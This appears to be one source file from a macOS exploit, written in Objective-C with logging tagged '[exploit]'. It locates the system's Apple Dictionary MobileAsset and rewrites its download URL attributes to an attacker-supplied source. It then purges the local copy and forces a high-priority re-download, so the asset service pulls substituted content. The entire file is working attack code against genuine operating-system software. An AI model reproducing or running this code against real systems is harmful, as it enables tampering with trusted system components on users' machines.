#import "DictAssets.h"

#define LOG(format, ...) NSLog(@"[exploit] "format, ## __VA_ARGS__)

const static NSString *kType = @"com.apple.MobileAsset.DictionaryServices.dictionaryOSX";

@implementation DictAssets : NSObject

+ (FakeAsset*) find {
    const static NSString *kVictim = @"com.apple.dictionary.AppleDictionary";
    ASAssetQuery *query = [[ASAssetQuery alloc] initWithAssetType:kType];
    query.predicate = [NSPredicate predicateWithFormat:
                       @"DictionaryIdentifier == [c]%@ "
                       /*@"and __DownloadState == [c]'Downloaded' "*/, kVictim];
    NSError *err = NULL;
    [query runQueryAndReturnError:&err];
    if (err) {
        LOG("failed to fetch dictionary: %@", err);
        abort();
    }

    NSArray *results = [query results];
    if (![results count]) {
        LOG("unable to find replace target");
        abort();
    }

    ASAsset *asset = [results objectAtIndex:0];
    FakeAsset *fake = [[FakeAsset alloc] initWithAsset:asset];
    return fake;
}

@end

@implementation FakeAsset : NSObject

- (id)initWithAsset:(ASAsset *)asset {
    self = [super init];
    if (self)
        self.asset = asset;
    return self;
}

- (void)setAsset:(ASAsset *)asset {
    _asset = asset;
    self.attributes = [[asset attributes] mutableCopy];
}

- (void)setSource:(NSString *)remote {
    _source = remote;
    if (_attributes[@"__RemoteURL"]) {
        _attributes[@"__RemoteURL"] = remote;
    } else {
        NSURL *url = [NSURL URLWithString:remote];
        NSUInteger index = remote.length - url.path.length;
        _attributes[@"__RelativePath"] = url.path;
        _attributes[@"__BaseURL"] = [remote substringToIndex:index];
    }
}

- (void)update:(NSDictionary *)meta {
    for (id key in meta) {
        _attributes[key] = meta[key];
    }
}

- (boolean_t)downloadNonBlocking {
    return [self downloadAndWait:NO];
}

- (boolean_t)downloadBlocking {
    return [self downloadAndWait:YES];
}

- (boolean_t)downloadAndWait:(boolean_t)wait {
    if ([_asset isPresentOnDisk] && [_asset state] == 1) {
        // delete locally
        NSError *error = nil;
        [_asset purgeAndReturnError:&error];
        if (error) {
            LOG("warning: failed to purge local asset\n%@", error);
        }
    }

    NSDictionary *kDownloadOptions = @{
                                       @"DownloadOptionAllowWiFi": @YES,
                                       @"DownloadOptionAllow4G": @YES,
                                       @"DownloadOptionAllow3G": @YES,
                                       @"DownloadOptionAllow2G": @YES,
                                       @"DownloadOptionPriority": @"DownloadPriorityHigh",
                                       };

    _attributes[@"__DownloadState"] = @"AutomaticUpdate";
    ASAsset *asset = [[ASAsset alloc] initWithAssetType:kType attributes:_attributes];
    [asset setUserInitiatedDownload:YES];
    __block dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    __block boolean_t ok = NO;
    [asset setProgressHandler:^(NSDictionary *state, NSError *err) {
        if (err) {
            LOG("error: %@", err);
            abort();
        } else if ([[state objectForKey:@"Operation"] isEqualToString:@"OperationCompleted"]) {
            ok = YES;
            dispatch_semaphore_signal(sem);
        } else if ([state[@"Operation"] isEqualToString:@"Stalled"]) {
            LOG("Network failure");
            abort();
        }
    }];
    [asset beginDownloadWithOptions:kDownloadOptions];
    if (wait) dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
    return ok;
}

@end

